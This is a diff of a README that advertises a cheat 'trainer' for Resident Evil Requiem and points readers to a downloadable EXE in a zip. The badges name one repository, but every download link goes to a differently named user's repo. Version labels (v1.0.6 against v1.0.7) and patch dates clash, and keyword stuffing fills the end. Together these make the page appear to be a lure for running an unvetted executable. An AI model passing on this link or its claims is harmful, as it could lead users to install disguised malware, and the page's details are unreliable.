@@ -1,7 +1,4 @@
-<img width="444" height="750" alt="image" src="https://github.com/user-attachments/assets/0fd3eabc-83a5-40af-bc7a-ee138e36477c" />
-
-
-  [![GitHub release](https://img.shields.io/github/v/release/ModEngineLabs/resident-evil-requiem-sourse?color=green&label=Latest%20v1.0.6)](https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip)
+[![GitHub release](https://img.shields.io/github/v/release/ModEngineLabs/resident-evil-requiem-sourse?color=green&label=Latest%20v1.0.6)](https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip)
   [![GitHub stars](https://img.shields.io/github/stars/ModEngineLabs/resident-evil-requiem-sourse?style=social)](https://github.com/ModEngineLabs/resident-evil-requiem-sourse/stargazers)
   [![License](https://img.shields.io/badge/License-Educational-blue)](LICENSE)
   [![Platform](https://img.shields.io/badge/Platform-Windows%20x64-orange)](https://github.com/ModEngineLabs/resident-evil-requiem-sourse)
@@ -12,13 +9,16 @@
 
   <p><strong>Только оффлайн / single-player режим!</strong> Использование в RE.Net, Mercenaries или любых онлайн-элементах → высокий риск бана.</p>
 
-  <p><strong>Текущая версия игры:</strong> v1.7 (Steam AppID 3764200) • Патч launch day 03.03.2026</p>
+  <p><strong>Текущая версия игры:</strong> v1.7 (Steam AppID 3764200) • Патч launch day 12.03.2026</p>
 
   <a href="https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip">
     <img src="https://img.shields.io/badge/Download%20v1.0.6%20Ready%20EXE-2E7D32?style=for-the-badge&logo=windows&logoColor=white" alt="Download v1.0.7"/>
   </a>
 
 </div>
+
+<img width="444" height="750" alt="image" src="https://github.com/user-attachments/assets/61b3da88-6f92-43fb-8840-942a7eb6df91" />
+
 
 # Professional Game Trainer for Resident Evil Requiem (RE9) V 1.0.7
 - Updated for the current game patch 05.03.2026
@@ -332,6 +332,7 @@ re9 trainer v1.0 steam
 resident evil requiem fearless revolution  
 
 resident-evil-requiem, resident-evil-requiem-cheats, re9-trainer, requiem-fling, fling-trainer-requiem, god-mode-re9, infinite-health-re9, infinite-ammo-re9, no-recoil-re9, rapid-fire-re9, super-accuracy-requiem, infinite-grenades-re9, weapon-durability-re9, highlight-interactables-requiem, super-damage-re9, one-hit-kill-re9, unlock-extras-requiem, edit-cp-re9, pc-cheats-requiem, survival-horror-trainer
+
 
 
 
